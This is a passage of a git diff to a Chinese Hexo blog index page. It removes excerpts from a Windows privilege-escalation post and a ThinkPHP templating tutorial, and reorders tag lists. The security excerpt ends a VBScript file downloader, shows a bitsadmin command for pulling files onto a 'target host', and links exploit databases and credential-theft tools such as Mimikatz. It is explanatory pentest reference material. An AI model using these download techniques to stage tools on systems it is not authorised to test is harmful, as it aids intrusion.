class="line">Set objFSO = Createobject(&quot;Scripting.FileSystemObject&quot;)</div><div class="line">If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocation</div><div class="line">Set objFSO = Nothing</div><div class="line"></div><div class="line">objADOStream.SaveToFile strHDLocation</div><div class="line">objADOStream.Close</div><div class="line">Set objADOStream = Nothing</div><div class="line">End if</div><div class="line"></div><div class="line">Set objXMLHTTP = Nothing</div></pre></td></tr></table></figure></p>
-<p>运行下载脚本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cscript.exe downloadfile.vbs</div></pre></td></tr></table></figure></p>
-</blockquote>
-<p>####bitsadmin</p>
-<blockquote>
-<p>或者如果你知道目标主机为Windows 7 以上的操作系统，则可使用bitsadmin实现下载<br>目标url:<a href="http://static.myhack58.com/img/logo.jpg" target="_blank" rel="external">http://static.myhack58.com/img/logo.jpg</a><br>保存地址:D:\logo.jpg<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bitsadmin /rawreturn /transfer getfile http://static.myhack58.com/img/logo.jpg D:\logo.jpg</div></pre></td></tr></table></figure></p>
-<p>Exploits and shellcode</p>
-</blockquote>
-<p><a href="http://www.exploit-db.com" target="_blank" rel="external">http://www.exploit-db.com</a><br><a href="http://1337day.com" target="_blank" rel="external">http://1337day.com</a><br><a href="http://0day.today" target="_blank" rel="external">http://0day.today</a><br><a href="http://www.securityfocus.com" target="_blank" rel="external">http://www.securityfocus.com</a><br><a href="http://seclists.org/fulldisclosure/" target="_blank" rel="external">http://seclists.org/fulldisclosure/</a><br><a href="http://www.exploitsearch.net" target="_blank" rel="external">http://www.exploitsearch.net</a><br><a href="http://www.securiteam.com" target="_blank" rel="external">http://www.securiteam.com</a><br><a href="http://metasploit.com/modules/" target="_blank" rel="external">http://metasploit.com/modules/</a><br><a href="http://securityreason.com" target="_blank" rel="external">http://securityreason.com</a><br><a href="https://cxsecurity.com/exploit/" target="_blank" rel="external">https://cxsecurity.com/exploit/</a><br><a href="http://securitytracker.com/" target="_blank" rel="external">http://securitytracker.com/</a></p>
-<blockquote>
-<p>其他优秀资源</p>
-</blockquote>
-<p><a href="https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/Draft/Privilege%20Escalation%20%26%20Post-Exploitation.md#privilege-escalation---windows" target="_blank" rel="external">rmusser01’s GitHub document to Post Exploitation on Windows</a><br><a href="http://it-ovid.blogspot.in/2012/02/windows-privilege-escalation.html" target="_blank" rel="external">Tim Arneaud on Windows Privilege Escalation</a><br><a href="http://betanews.com/2011/01/14/wmic-the-best-command-line-tool-you-ve-never-used/" target="_blank" rel="external">An article on WMIC</a><br><a href="https://labs.mwrinfosecurity.com/blog/how-to-own-any-windows-network-with-group-policy-hijacking-attacks/" target="_blank" rel="external">Luke Jennings on Group Policy Hijacking Attacks</a><br><a href="https://youtu.be/xll_RXQX_Is" target="_blank" rel="external">Toying with the Windows API</a><br><a href="https://github.com/enaqx/awesome-pentest" target="_blank" rel="external">enaqx - Excellent curated collection of content</a></p>
-<p><a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc" target="_blank" rel="external">PowerShellMafia’s PowerSploit</a><br><a href="https://technet.microsoft.com/en-us/sysinternals/bb842062" target="_blank" rel="external">The SysInternals suite</a><br><a href="http://www.ampliasecurity.com/research/windows-credentials-editor/" target="_blank" rel="external">Windows Credential Editor</a><br><a href="http://blog.gentilkiwi.com/mimikatz" target="_blank" rel="external">Mimikatz - Credential Extraction</a><br><a href="https://github.com/GDSSecurity/Windows-Exploit-Suggester" target="_blank" rel="external">GDSSecurity’s Windows Exploit Suggester</a><br><a href="https://github.com/SpiderLabs/Responder" target="_blank" rel="external">SpiderLab’s Responder - A LLMNR, NBT-NS and MDNS poisoner</a><br><a href="https://github.com/PowerShellEmpire/Empire" target="_blank" rel="external">PowerShellEmpire’s Empire - Pure PowerShell post-exploitation agent</a><br><a href="https://github.com/rabbitstack/fibratus" target="_blank" rel="external">rabbitstack’s fibratus - A tool for exploration and tracing of the Windows kernel</a></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Linux</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">提权</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/sec/" class="article-tag-list-link color4">sec</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/sec/Windows-提权方法总结/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-
-
-
-
-
-
-
-  
-    <article id="post-ThinkPHP折腾笔记" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/others/ThinkPHP折腾笔记/">ThinkPHP折腾笔记</a>
-    </h1>
-  
-
-        
-        <a href="/others/ThinkPHP折腾笔记/" class="archive-article-date">
-  	<time datetime="2016-11-21T11:41:09.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2016-11-21</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h1><blockquote>
-<p>将ThinkPHP下载后，解压至网站根目录<br>为了快速安装PHP环境，我使用的是<a href="http://www.phpstudy.net/" target="_blank" rel="external">phpStudy</a><br>在ThinkPHP的同级目录创建index.php，文件内容为<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line">define(<span class="string">'APP_DEBUG'</span>,<span class="keyword">true</span>);</div><div class="line">define(<span class="string">'APP_NAME'</span>, <span class="string">'App'</span>);</div><div class="line">define(<span class="string">'APP_PATH'</span>,<span class="string">'./App/'</span>);</div><div class="line"><span class="keyword">require</span>(<span class="string">'./ThinkPHP/ThinkPHP.php'</span>);</div></pre></td></tr></table></figure></p>
-<p>该文件会创建名为App的文件夹，目录结构大概这样子<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">.</div><div class="line">├── Common</div><div class="line">├── Conf</div><div class="line">│   ├── config.php</div><div class="line">├── Lang</div><div class="line">├── Lib</div><div class="line">│   ├── Action</div><div class="line">│   │   └── IndexAction.class.php</div><div class="line">│   ├── Behavior</div><div class="line">│   ├── Model</div><div class="line">│   └── Widget</div><div class="line">├── Runtime</div><div class="line">│   ├── Cache</div><div class="line">│   │   ├── 9885ecc411f90bec36756701bd64bb4a.php</div><div class="line">│   │   └── f331a3f0d874c4248458495ef2c2c2d1.php</div><div class="line">│   ├── Data</div><div class="line">│   ├── Logs</div><div class="line">│   │   └── 16_11_27.log</div><div class="line">│   └── Temp</div><div class="line">└── Tpl</div></pre></td></tr></table></figure></p>
-</blockquote>
-<p><img src="https://ww2.sinaimg.cn/large/006tNc79gy1fdtjjju733j30dq089t8n.jpg" alt="start"></p>
-<blockquote>
-<p>如果要添加函数，可在Common文件夹下创建common.php文件进行实现，然后在lib/Action/IndexActionclass.php中直接通过函数名进行调用。比如</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"> cat Common/common.php</div><div class="line">&lt;?php</div><div class="line">function show()&#123;</div><div class="line">  echo &apos;hello world1&apos;;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">cat Lib/Action/IndexAction.class.php</div><div class="line">&lt;?php</div><div class="line">// 本类由系统自动生成，仅供测试用途</div><div class="line">class IndexAction extends Action &#123;</div><div class="line">    public function index()&#123;</div><div class="line">      //echo C(&apos;name&apos;),&apos;&lt;br/&gt;&apos;;</div><div class="line">      //echo C(&apos;sex&apos;);</div><div class="line">    //  echo C(&apos;URL_MODEL&apos;),&apos;&lt;br/&gt;&apos;;</div><div class="line">      //echo U(&apos;index/user&apos;,array(&apos;id&apos;=&gt;1),&apos;html&apos;,false,&apos;localhost&apos;);</div><div class="line">      show();</div><div class="line">      // $arr=array(1,2,3,4,5);</div><div class="line">      // dump($arr);</div><div class="line">      // $this-&gt;display();</div><div class="line"></div><div class="line">    &#125;</div><div class="line">    public function user()&#123;</div><div class="line">      echo &apos;id is:&apos;.$_GET[&apos;id&apos;].&apos;&lt;br/&gt;&apos;;</div><div class="line">      // echo &apos;这里是INDEX模块的user方法&apos;;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<blockquote>
-<p>如果要添加模板的话</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">在Tpl目录下创建函数同名的文件夹如Index在该文件夹中创建index.html，</div><div class="line">然后在IndexAction.class.php通过$this-&gt;display();进行调用</div><div class="line">如果Tpl/Index目录下有多个html，则通过$this-&gt;display(&apos;文件名&apos;);进行调用</div></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html lang=&quot;en&quot;&gt;</div><div class="line">&lt;head&gt;</div><div class="line">  &lt;meta charset=&quot;UTF-8&quot;&gt;</div><div class="line">  &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</div><div class="line">  &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt;</div><div class="line">  &lt;title&gt;Document&lt;/title&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line">Hello World.</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
-<h2 id="模板输入"><a href="#模板输入" class="headerlink" title="模板输入"></a>模板输入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&#123;$now|date=&apos;Y-m-d H:i:s&apos;,###&#125;&lt;p/&gt;</div><div class="line"></div><div class="line">&#123;$Think.now&#125;&lt;p/&gt;</div><div class="line">&#123;$Think.version&#125;&lt;p/&gt;</div></pre></td></tr></table></figure>
-<h2 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;for start=&apos;1&apos; end=&apos;10&apos;  name=&apos;k&apos;&gt;</div><div class="line">  &#123;$k&#125;&lt;br/&gt;</div><div class="line">&lt;/for&gt;</div></pre></td></tr></table></figure>
-<h2 id="if"><a href="#if" class="headerlink" title="if"></a>if</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;if condition=&apos;$num gt 10&apos;&gt;</div><div class="line">  num &gt; 10</div><div class="line">&lt;elseif condition=&quot;$num lt 10&quot;/&gt;num &lt; 10</div><div class="line">&lt;else/&gt;num===10</div><div class="line">&lt;/if&gt;</div></pre></td></tr></table></figure>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/others/" class="article-tag-list-link color2">others</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/others/ThinkPHP折腾笔记/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-
-
-
-
-
-
-
-  
   
     <nav id="page-nav">
       <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
@@ -1236,6 +1175,10 @@ var _hmt = _hmt || [];
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">数据处理</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">MongoDB</a>
               </li>
              
@@ -1248,15 +1191,19 @@ var _hmt = _hmt || [];
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">Python</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">SQL Server</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">Perl</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">TensorFlow</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">Python</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1276,11 +1223,11 @@ var _hmt = _hmt || [];
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">前端</a>
+                <a href="javascript:void(0)" class="js-tag color2">others</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">others</a>
+                <a href="javascript:void(0)" class="js-tag color3">前端</a>
               </li>
              
               <li class="article-tag-list-item">
